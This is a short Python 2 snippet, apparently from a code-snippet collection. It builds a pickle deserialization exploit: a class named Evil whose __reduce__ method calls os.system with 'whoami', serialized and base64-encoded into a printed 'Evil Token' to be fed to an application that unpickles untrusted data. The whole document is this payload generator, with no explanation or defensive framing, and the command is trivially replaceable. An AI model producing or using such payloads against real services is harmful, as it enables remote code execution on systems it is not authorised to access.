---
id: df6517d1-e1c3-4781-84d3-dc3f711e317a
type: code
language: Python
verified: false
created_at: '2023-04-06T03:55:59.484661+00:00'
updated_at: '2023-04-06T03:55:59.492105+00:00'
---

# Code Snippet df6517d1

**Language**: Python

```python
import cPickle, os
from base64 import b64encode

class Evil(object):
    def __reduce__(self):
        return (os.system,("whoami",))

e = Evil()
evil_token = b64encode(cPickle.dumps(e))
print("Your Evil Token : {}").format(evil_token)
```


